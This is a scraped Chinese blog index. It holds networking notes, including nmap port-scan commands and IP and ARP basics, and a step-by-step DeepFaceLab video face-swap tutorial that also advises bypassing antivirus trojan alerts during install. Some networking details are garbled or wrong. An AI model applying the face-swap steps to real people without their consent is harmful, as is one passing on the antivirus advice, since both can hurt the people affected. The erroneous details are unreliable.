","date":"2021-12-14","objectID":"/zh-cn/14/:3:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"释放连接–四次挥手 第一次挥手𝐹𝐼𝑁=1，𝑠𝑒𝑞=𝑥FIN=1，seq=x假设客户端想要关闭连接，客户端发送一个 FIN 标志位置为1的包，表示自己已经没有数据可以发送了，但是仍然可以接受数据。发送完毕后，客户端进入 FIN_WAIT_1 状态。 第二次挥手𝐴𝐶𝐾=1，𝐴𝐶𝐾𝑛𝑢𝑚=𝑥+1ACK=1，ACKnum=x+1服务器端确认客户端的 FIN 包，发送一个确认包，表明自己接受到了客户端关闭连接的请求，但还没有准备好关闭连接。发送完毕后，服务器端进入 CLOSE_WAIT 状态，客户端接收到这个确认包之后，进入 FIN_WAIT_2 状态，等待服务器端关闭连接。 第三次挥手𝐹𝐼𝑁=1，𝑠𝑒𝑞=𝑦FIN=1，seq=y服务器端准备好关闭连接时，向客户端发送结束连接请求，FIN 置为1。发送完毕后，服务器端进入 LAST_ACK 状态，等待来自客户端的最后一个ACK。 第四次挥手𝐴𝐶𝐾=1，𝐴𝐶𝐾𝑛𝑢𝑚=𝑦+1ACK=1，ACKnum=y+1客户端接收到来自服务器端的关闭请求，发送一个确认包，并进入 TIME_WAIT状态，等待可能出现的要求重传的 ACK 包。服务器端接收到这个确认包之后，关闭连接，进入 CLOSED 状态。客户端等待了某个固定时间（两个最大段生命周期，2MSL，2 Maximum Segment Lifetime）之后，没有收到服务器端的 ACK ，认为服务器端已经正常关闭连接，于是自己也关闭连接，进入 CLOSED 状态。 端口扫描 ","date":"2021-12-14","objectID":"/zh-cn/14/:4:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"NMap – Network Mapper ","date":"2021-12-14","objectID":"/zh-cn/14/:5:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"nmap端口状态 标志 含义 open 应用程序在该端口接收 TCP 连接或者 UDP 报文。 closed 关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered 由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered 未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered 无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered （关闭或者被过滤的） ","date":"2021-12-14","objectID":"/zh-cn/14/:5:1","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"扫描tcp端口 扫描port1到port2的所有端口 + port3 + port4 nmap [IP] -p[port1]-[port2],port3,port4 如果不加参数,nmap默认扫描1024加上nmap-services列出的端口 并且可能扫描到开放的端口,但未知其服务,可能不会显示 经过笔者测试520端口的http服务不加参数的nmap无法扫描出来 加了参数可以 ","date":"2021-12-14","objectID":"/zh-cn/14/:5:2","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"扫描udp端口 nmap -sU [IP] -Pn -sU：表示udp scan ， udp端口扫描 -Pn：不对目标进行ping探测（不判断主机是否在线）（直接扫描端口） 网络层 ","date":"2021-12-14","objectID":"/zh-cn/14/:5:3","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"常见协议: 地址解析协议:ARP𝐴𝑑𝑑𝑟𝑒𝑠𝑠𝑅𝑒𝑠𝑜𝑙𝑢𝑡𝑖𝑜𝑛𝑃𝑟𝑜𝑡𝑜𝑐𝑎𝑙AddressResolutionProtocal 网际控制报文协议:ICMP𝐼𝑛𝑡𝑒𝑟𝑛𝑒𝑡𝐶𝑜𝑛𝑡𝑟𝑜𝑙𝑀𝑒𝑠𝑠𝑎𝑔𝑒𝑃𝑟𝑜𝑡𝑜𝑐𝑜𝑙InternetControlMessageProtocol 网际组管理协议:IGMP𝐼𝑛𝑡𝑒𝑟𝑛𝑒𝑡𝐺𝑟𝑜𝑢𝑝𝑀𝑎𝑛𝑎𝑔𝑒𝑚𝑒𝑛𝑡𝑃𝑟𝑜𝑡𝑜𝑐𝑜𝑙InternetGroupManagementProtocol ","date":"2021-12-14","objectID":"/zh-cn/14/:6:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"常见中间设备: 物理层: 网桥或桥接器 路由器 网关 ","date":"2021-12-14","objectID":"/zh-cn/14/:7:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"IP的分类 网络类别 最大可指派的网络数 第一个可指派的网络号 最后一个可指派的网络号 每个网络中的最大主机数 A 12627−227−2 1 126 166777214 B 16383224−1224−1 128.1 191.255 65534 C 2097151221−1221−1 192.0.1 223.255.255 254 ","date":"2021-12-14","objectID":"/zh-cn/14/:8:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"常见的三类IP地址 A类 网络字段占一个字节,但第一位已被固定为”0”,故仅有7位可用 主机号有24位 B类 网络字段占两个字节,但前两位已被固定为”10”,故仅有14位可用 主机号有16位 C类 网络字段占三个字节,但前三位已被固定为”110”,故仅有21位可用 主机号有8位 ","date":"2021-12-14","objectID":"/zh-cn/14/:8:1","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"特殊的IP地址 网络号 主机号 意义 0 0 本网络的本主机 0 host-id 本网络的某主机 全1 全1 只在本网络广播 net-id 全1 对net-id所有主机广播 127 任何数 环回地址 ","date":"2021-12-14","objectID":"/zh-cn/14/:8:2","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"ARP协议 当主机A要向主机B发送数据报时,先从ARP高速缓存中查看主机B的地址 ","date":"2021-12-14","objectID":"/zh-cn/14/:9:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"找到主机B的MAC地址 把MAC地址写入MAC帧 ","date":"2021-12-14","objectID":"/zh-cn/14/:9:1","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"找不到主机B的MAC地址 通过ARP进程在本局域网发送ARP请求分组 本局域网所有主机收到此ARP请求分组 主机B的IP地址和ARP要求的IP地址一致,收下ARP请求分组,并向主机A发送ARP响应分组 主机A收到主机B的ARP响应分组后,在其高速缓存中写入主机B的IP地址到MAC地址的映射 ","date":"2021-12-14","objectID":"/zh-cn/14/:9:2","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"IP数据包 2.jpg 版本 : 4bit.（表示使用的 IPv4协议），对等层之间要使用同一种IP协议（IPv4协议） 首部长度:4 bit ，可表示的最大数值为15个单位（1111），一个单位一个字节，最大为60字节,最小为20字节 服务类型:8 bit 总长度:16 bit,最大值2^16 - 1 = 65535 字节 标识:16 bit，它是一个计数器，用来产生数据包的标识 标志:3bit,数据包在传输的过程中，标志字段MF（More Fregment），MF = 1表示后面还有分片，MF = 0 表示最后一个分片 片偏移:13bit,每个数据片不同时传输，标志着某片在原分组中的相对偏移位置，以8字节为偏移单位 生存时间:8bit 协议:8bit,指出该数据报使用的协议 首部检验和:16bit,字段只校验数据报的首部，不包含数据部分 源地址：32bit 源地址：32bit ","date":"2021-12-14","objectID":"/zh-cn/14/:10:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"子网掩码 ","date":"2021-12-14","objectID":"/zh-cn/14/:11:0","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["网络"],"content":"如何构造子网掩码 以C类IP为例 课表示的子网个数 == 2^n 每个子网可分配的主机IP数 == 28−𝑛−2 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-14","objectID":"/zh-cn/14/:11:1","tags":["网络"],"title":"计算机网络","uri":"/zh-cn/14/"},{"categories":["AI 换脸"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # DeeFaceLab3：模型的异同，选择，基础操作！ 关于视频换脸软件DeepFaceLab3.0的完整使用流程已经在上一篇介绍过，为了演示方便，当时使用的是Quick96模型，而实际应用中使用最多的是SAEHD模型，后面又推出了AMP模型。那么问题来了，这么多模型，他们有什么差别，如何选择，以及模型相关的操作有哪些？今天就来讲一讲这些模型的差别，如何选择，以及如何操作。 ","date":"2021-12-13","objectID":"/zh-cn/13-3/:0:0","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":"1.有什么差别？ ","date":"2021-12-13","objectID":"/zh-cn/13-3/:1:0","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":"硬件要求不一样。 默认情况下对硬件资源的需求是：AMP\u003eSAEHD\u003eQuick96！这个意思就是，越是左边对硬件要求越高，硬件主要指显卡（GPU）和显存（VRAM）以及处理器(CPU) ","date":"2021-12-13","objectID":"/zh-cn/13-3/:1:1","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":"应用场景不一样。 Quick96适合入门，适合快速合成的项目。特点就是快，缺点就是质量一般般。 SAEHD用于高质量的视频合成，相应的学习和训练的时间也会被拉长。 AMP为了实时换脸而打造，为了这个目的而做了一些优化。 ","date":"2021-12-13","objectID":"/zh-cn/13-3/:1:2","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":"参数不一样。 Quick96几乎不需要设置参数，打开就用。 SAEHD 有很多参数，可以设置模型像素，模型结构，人脸类型等。 AMP在SAEHD的基础上删减和引入了新的参数，使其更加适合于实时换脸的场景。 SAEHD参数： AMP参数： AMP引入的主要参数是变形因子，遮罩训练和模型结构已经变成默认选项。 训练预览图也不一样。 SAEHD预览图： AMP预览图： SAEHD的预览图代表什么含义之前有聊过，AMP默认模型的预览图变成了两行三列，第一行为原图，第二行为算法生成图。第一列为src,第二列为dst，第三列为生成图。 ","date":"2021-12-13","objectID":"/zh-cn/13-3/:1:3","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":"2. 如何选择？ 其实知道了差别，就应该大概明白怎么选了。核心原则就是根据自身情况和应用场景选择。比如你的显卡显存只有2G，那么你就直接选择Quick96好了，其他基本没得选了。如果你需要能灵活设置参数，实现高质量的视频换脸，那么肯定用SAEHD。如果你训练模型是为了应用在DeepFaceLive中实现实时换脸，那么推荐AMP。当然，SAEHD其实也是可以用于DeepFaceLvie。 ","date":"2021-12-13","objectID":"/zh-cn/13-3/:2:0","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":"3. 如何操作？ 模型相关的操作，简单来说来说就只有两种，训练和应用（合成），这两个操作在上一篇文章中已经演示过了，只要点击训练和应用BAT文件即可。今天就来讲讲更加细化的一些操作。开始具体介绍前，强调两个点：1. 回车代表确认，代表应用默认参数，会用到很多次，遇事不决就按回车。2. 所有快捷键必须先选中预览窗口，输入法切换成英文模式，才有用。 如何设置模型参数？ 在之前的教程中，我们都是采用一路回车的方式，全部使用默认参数。今天就来说一下如何设置参数。 这里以SAEHD为例，先双击BAT文件。打开后可以输入一个模型名字test回车，然后会让你选择设备。按一下回车，默认选中显卡。 选完设备之后就可以开始设置参数，参数设置的具体操作是输入参数值然后按回车即可。参数大致可以分为几种类型：数字，是否，字符串。 比如目标迭代数后面就是跟一个数字。像素后面也是设置一个数字，但是这个数字有范围限制64-640。人脸替换类型后面需要输入类型缩写，wf代表整脸。随机翻转后面需要输入y或者n，表示启用或者不起用。 如果不知道参数如何设置，可以查看右边的（），里面给出了参考值和取值区间。还可以输入?回车，然后会有参数的详细说明。 不需要修改的参数直接回车就好！ ","date":"2021-12-13","objectID":"/zh-cn/13-3/:3:0","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":"如何修改模型参数？ 模型生成后，可以调整参数，获取更好的效果。但是并非所有参数都可以修改，比如像素，模型结构无法中途修改。 具体的修改方式如上图，点击训练重量级模型.bat。1. 输入序号选中test模型，2. 直接回车选中显卡，3. 当跳出“两秒内…”提示的时候快速按回车进入修改模式。4. 按回车找到需要修改的参数，然后输入新的参数值，按回车确认即可。SAEHD能中途修改的参数如上图。 如何查看模型效果？ 模型训练的过程会实时显示训练的进度。 这个窗口顶部是一些快捷键的提示。 中间有显示一个黄色和蓝色的曲线。这是loss值连成的线。一般都是左边高右边低。如果高高低低就是模型训练过程中换了很多素材。蓝色和黄色分别代表src和dst。 下面显示模型训练效果。 这个图只需重点关注第二列，第四列，第五列。二四列清晰即可，五列的表情能跟上第四例即可。 如何关闭训练？ 直接点击右上角X关闭，注意关闭预览窗口并不会停止训练。关闭黑色的命令行窗口才会结束。推荐的关闭方式是按回车Enter，这样可以保存进度并结束。直接叉掉会丢失一点点进度。 如何保存进度？ 按键盘上的S会保存进度，按Enter会保存进度并立马结束训练。 如何创建备份？ 按B可直接备份当前模型，备份的模型会单独保存在_autobackups文件夹下面，按一次保存一个备份。 如何继续训练？ 再次点击训练的Bat文件，选择模型，选择设备，就可以继续训练了。训练的过程要避免意外中断，如果刚好在自动保存模型的时候突然关机了会损坏模型。 如何修改模型名称？ 启动训练后输入r (rename) 回车，然后输入老的模型名称回车，然后输入新的模型名称回车即可。 如何选择模型？ 如果你只有一个模型，直接回车就会加载模型。如果你有两个模型，你需要选择载入的模型。当启动训练后会列出所有模型，列表左侧有序号，输入相应的序号回车即可。 如何复用模型？ DeepFaceLab的模型并不是训练一次，就可以应用于任何素材。他是属于一对一的模型。一个源素材一个目标素材，对应一个模型。训练一次少则几天多则几十天，这一点显然很要命。好在模型可以进行一定的复用，可以节省大量时间，也能提升合成效果。这样就可以把炼丹和应用区分开了。有些人专门炼丹，有些人直接拿来用就好了。把自己或者别人的模型直接拿来用就是“模型复用”了 模型复用的操作其实很简单。 \\1. 准备好自己的素材，把人脸提取好。 \\2. 把复用模型的文件放到自己的model目录下面。 \\3. 训练一段时间，几十分钟或者几个小时。 \\4. 应用模型 ，合成视频。 其实和常规的训练合成流程没啥差别，只是复用的时候是用的别人的模型文件或者你自己之前训练好的模型。 值得注意的是，复用也不是放之四海而皆准。复用丹没练好，可能会影响后面制作的效果，也可能有些场景很好用，有些场景不好用，这都很常见。 模型相关的点基本都提到了， 下一篇我们就专门来说AMP模型（实时换脸/直播模型）的两种训练方式和具体的训练步骤。 ——————- DeepFaceLab3系列 DeepFaceLab3：软硬件以及系统要求 DeepFaceLab3：工作目录和基本概念 DeepFaceLab3：视频换脸完整流程详解！ DeepFaceLab3：模型的异同，选择，基础操作！ 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-13","objectID":"/zh-cn/13-3/:3:1","tags":["AI 换脸"],"title":"DeeFaceLab3：模型的异同，选择，基础操作！","uri":"/zh-cn/13-3/"},{"categories":["AI 换脸"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # DeepFaceLab3：视频换脸完整流程 对于刚入门的朋友来说，你给他直接上心法肯定没啥有，最直接的还是教招式。实操，才有感觉嘛！DeepFaceLab虽然版本一直在升级，但是整体步骤和执行逻辑并没有太大变化。所以老教程现在一样能用了。但是为了教程的完整性，我就全部重写一遍，稍作改进。 ","date":"2021-12-13","objectID":"/zh-cn/13-2/:0:0","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"安装软件 安装过程其实非常简单。一般发布的软件包都是.exe结尾，本质上其实就是一个用7z压缩的压缩包而已。所以安装只要双击就好了，大家都会的！ 安装的时候需要注意几个点。 第一：杀毒软件可能会有木马警报，添加信任就好。杀毒软件可能会无警报删文件，导致执行的时候出现未知错误。这种情况可以先退杀毒软件，安装完了就不受影响。 第二：安装的时候记得选好路径 路径并没有硬性要求，默认是解压到安装包所在路径。有不少人对路径并不是很敏感。比如通过QQ群文件下载的，就直接解压在路径超深的QQ缓存目录中，这样可能会出问题，而且不好找。最好是放在C盘外的其他盘的根目录。文件路径不强制英文，但是依旧不推荐中文。文件名不要用特殊字符，降低出错概率。 第三： 输入密码 我发布的文件如果有密码，就都是deepfaker.xyz。不管哪个版本直接输入就好了。当然，你任性，也可以不输入。 不输入就是上面这种结果。然后你点1，2，3，4每个步骤都点不动。因为不看英文或者大意，犯这个错误的也不少。 正确的打开方式是这样的。里面会有_internal和workplace文件夹。前者放的是源代码和软件相关的内容，后者是工作目录，上一篇有讲过。除此之外还有一堆.bat结尾的文件。可以把这些称为脚本或者批处理文件。里面是一行行的DOS命令。 批处理文件打开方式和EXE一模一样，Double kill ~~Double click 双击打开！每一个批处理文件都干一件事情，我们要做的就是按一定的顺序点击这些文件，就能完成换脸。是不是挺简单？ ","date":"2021-12-13","objectID":"/zh-cn/13-2/:1:0","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"执行步骤 DFL换脸的思路是，想将视频转换成图，从图片中提取人脸，从人脸中学习特征。然后应用模型，先对图片进行换脸，然后把图片合成视频，同时带上原视频的音轨。 具体来说可以分为如下几步： 源视频转图片 目标视频转图片 提取源头像 提取目标头像 训练模型 应用模型 合成视频 批处理文件步骤如下： 源视频转图片 extract images from video data_src.bat 目标视频转图片 extract images from video data_dst FULL FPS.bat 提取源头像 data_src faceset extract.bat 目标头像提取 data_dst faceset extract.bat 训练轻量级模型 train Quick96.bat/SAE/AMP 应用轻量级模型 merge Quick96.bat /SAE/AMP 合成 MP4 视频 merged to mp4.bat 杂七杂八交代清楚了就可以开始操作，本文会将每一个步骤截图说明。但是为了控制文章的体型，以操作为主。一些常见错误或者参数详解，会在后续文章中完成。关于操作，这里做一个重点提示：遇事不决按回车！ ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:0","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"Step1：源视频转图片 双击批处理文件源视频转图片 extract images from video data_src.bat 跳出黑色窗口，输入10回车，然后输入jpg回车，就会自动开始将视频分解为图片。 FPS：视频有一个指标叫帧率，常见有24，30，60等，代表一秒钟有几张。第一个参数输入10指的是一秒钟只取10张；不输入直接回车，默认帧率是30就取30张。因为很多影视剧画面相对固定，没必要全部取，否则后面会浪费大量提取时间，而且模型训练压力也会加大。 Format: 图片格式，主要是jpg和png。png是无损格式，但是JPG能在保证画质的情况下减少巨量的空间。所以如果不是要求特别变态，一般都用jpg。这样可以减少空间，节省时间 正常情况下，这个步骤执行非常快，出现“搞定/done” 的字样就是执行完成了。完成后，workplace/data_src下面就会出现很多图片，这就是从视频里分解出来的图片。文件名一般为0000x.jpg，其实这里面命名可以随意，没有强制要求。这里还有一个aligned的文件夹，是为后面步骤准备的。 ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:1","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"Step2：目标视频转图片 双击批处理文件目标视频转图片 extract images from video data_dst FULL FPS.bat 和上面的步骤类似，这次处理的是dst视频。因为dst必须一帧不落，所以没有FPS选项，只有图片格式这一个选项。 处理完后的图片保存在workspace/data_dst里面。 ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:2","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"Step3：提取源头像 双击批处理文件提取源头像 data_src faceset extract.bat 这一步的作用是提取源素材图片中的人脸。这里有六个参数，一般只需一路回车即可。第一次使用需要缓存GPU内核，需要稍微等一等。开始提取后底部有显示进度，当进度到100%，会显示图片数量和提取到的人脸数量，并出现“搞定！！！” 就证明已经出来成功并且处理完成。 处理完成后，头像保存在data_src/aligned下面。 不少人在这个环节会遇到问题。 常见问题是： 驱动不够新，去官网下载更新到最新版本即可。 软件不够新，deepfaker.xyz 上获取新版 显卡软件不匹配， A卡用Directx12，不要用rtx3000版。 提取完之后，如果src素材比较复杂，就需要做一些筛选。这个筛选可以写一篇很长的文章。这里简要说一下。主要是把一些不需要的素材删除： 很模糊的可以直接删除 不是目标人物的可以直接删除 图片残缺的删除 脸部有遮挡的删除 脸部光照差异特别大的删除 ….. ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:3","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"Step4：提取目标头像 双击批处理文件目标头像提取 data_dst faceset extract.bat 这一步的作用是提取目标素材图片中的人脸。和上一步非常类似，这里就是少了一个“保存调试图片”的参数。其实也不是少了，而是默认就执行了。 提取的头像保存在data_dst/aligned的文件夹里。 提取完之后也要对素材进行一个筛选。 把不是目标人物的素材删掉，把头像旋转的图片删掉。一般来说文件名后缀_1的都可以删掉。dst的删除核心原则是要换的人脸留下，不要换的统统删掉。 这些图标保存在aligned_debug里面 大概其中一张图片，可以看到人脸上有三种颜色的线框。 红色就是头像截取的区域，蓝色是面部区域，绿色是人脸轮廓，以及五官定位的点。其实就是人脸的landmark。通过debug你可以直观的看到人脸识别算法识别了哪些区域，有没有识别正确。 ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:4","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"Step5：训练模型 双击批处理文件 训练轻量级模型 train Quick96.bat 这一步是训练模型，所有步骤中最重要，最难，也是最耗时间的部分。目前新版本中主要包含三类模型，分别是Quick96,SAEHD,AMP 。 我把Quick96翻译为轻量级模型，优点是所需配置低，显存低，速度快，操作简单。缺点是不能自定义，像素比较低，合成效果差一些。 这个模型很简单，所以也非常适合拿来入门。所以本文就用这个来举例。SAEHD和AMP模型和模型训练的知识会另起一篇文章来介绍。 Quick96使用非常简单，双击批处理文件后，选择执行设备即可，这里一般都是选显卡，直接回车即可。设备选择完成之后，程序就会自动加载素材，并显示模型的参数，底部会有跳动的数字，然后会跳出一个预览窗口。 先来说说底部的数字，总共五列，分别代表：模型保存时间，迭代次数，单次迭代时间，源损失，目标损失。迭代次数是越多越好，损失是越低越好，零就是无损了嘛~不过，不可能达到！ 下面来说说预览窗口 预览窗口包含操作提示、loss曲线，人脸区域。人脸区域总共五列。第一列是src，第三列是dst。第二，四，五列为算法生成列，刚开始是纯色，啥头像都没有。随着训练的进行，会慢慢出现轮廓，鼻子，眼睛，然后慢慢变清晰。 训练的过程就是等待这几列变清晰的过程，最后一列就是换脸后的效果。 这一个步骤并不会自动结束，需要自己判断，然后手动结束。可以通过损失值和预览图来进行判断。一般来说损失值（loss）值到了0.1x就差不多了。但是素材质量和数量不一样，会影响这个指标的变化速度。比如素材特别少，这个值降的特别快，特别低。图片不是很清晰，这个值也降的特别快，特别低。反过来，图片质量高，数量多，这个就很难降低。但是这样情况下训练出来的模型更好。 相比数字而已，通过预览图来判断就更加直观了。只要观察第二列是否无限接近第一列，第四列是否无限接近第三列。第五列的表情是否无限接近第四列。所有列的图片是否都足够清晰。如果答案是“Yes” ，那么按回车或者直接关闭窗口，进入下一步。 正常情况下模型会过几十分钟保存一次，也可以手动按S直接保存。关闭后，可以重新点击批处理文件继续训练，不用担心丢失进度。当然，要防止意外关机和重启，可能会损坏模型。 ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:5","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"Step6：应用模型 双击批处理文件 应用轻量级模型 merge Quick96.bat 这个步骤要做的是将图片进行换脸。应用Quick96模型也很简单。启动直接按回车选中或者输入对应的数字选中上一步已经训练好的模型。然后软件就会加载模型并显示模型参数。 然后需要配置两个参数： 一个是是否启用交互模式，直接回车，默认启用。 一个是线程数量，输入小于等于8的数字，回车。注意，如果你核心特别多，默认回车会报错的！ 稍等一会儿会弹出帮助界面。 这个界面并没有任何功能上的用处，只是显示了这个环节可以使用的快捷键。每个快捷键旁边都有中文注释，可以看个大概，具体的参数含义我会在后面的文章中做一个详细的介绍。 点击这个界面，确保输入法为英文，按下键盘上的Tab，就可以进入合成预览界面 进来后，默认情况下都会有人皮面具的感觉，这是正常现象。因为我们参数还没有调整！就这个素材来说，只要调整W/S，E/D 快捷键即可。调整后的效果如下： 确认效果OK之后，按下快捷键shift+？（向后应用到所有帧） 然后再按下shift+\u003e（自动合成） 就开始自动合成了。也可以通过键盘上的\u003c 和 \u003e进行手动切换，查看前后帧的合成效果。 黑色窗口会显示所有的合成参数，并且显示进度条，等100%完成之后，手动关闭窗口即可。 此时，在data_dst下面已经多了两个文件，一个是merged，一个是merged_mask 进入merged可以看到很多图，这些图片中的人脸已经完全换脸。 进入merged_mask可以看到一些黑色的图片，中间有一个白色的区域。这些文件是为了方便后期制作。我们单纯使用DFL的不用太关心。 ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:6","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":"Step7：合成视频 双击批处理文件 合成 MP4 视频 merged to mp4.bat 这个步骤是将已经换好脸的图片转换成视频，并且会自动读取源视频的配置信息，包括帧率，音轨这些。这个环节只有一个输出码率的参数，常规来说3就够了。 除了合成mp4之外，还可以合成无损视频，AVI ，MOV等格式，便于后期处理。 执行完成后，workspace下面多了两个文件，分别是result.mp4 和 result_mask.mp4 。前者就是我们需要的最终视频，后者是遮罩视频，供后期使用。 双击打开视频，就可以看到最终效果啦。 步骤其实不难，细节很多。有些是可以直接照搬别人经验的。有些需要自己不断摸索。这并不是什么傻瓜软件，要做出好的效果肯定是要花时间研究。就像即便送你PS，PR，你没有一定的学习积累不可能做出酷炫的效果。但是我可以保证，市面上几乎所有神乎其技的换脸视频都是基于DFL，有些可能专门准备了道具场景并使用了后期制作。 DeepFaceLab3系列 DeepFaceLab3：软硬件以及系统要求 DeepFaceLab3：工作目录和基本概念 DeepFaceLab3：视频换脸完整流程详解！ DeepFaceLab3：模型的异同，选择，基础操作！ 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-13","objectID":"/zh-cn/13-2/:2:7","tags":["AI 换脸"],"title":"DeepFaceLab3：视频换脸完整流程","uri":"/zh-cn/13-2/"},{"categories":["AI 换脸"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # DeepFaceLab3：工作目录和基本概念 上一篇文章我们已经讲了安装DeepFaceLab所需要的软硬件环境。正常来说就可以进入安装，实操的阶段了。但是，我觉得安装之前还是要先结合workspace来讲一些概念，这样用起来会更加顺畅。workspace这个是软件自带的目录，安装完之后就已经存在了。 ","date":"2021-12-13","objectID":"/zh-cn/13-1/:0:0","tags":["AI 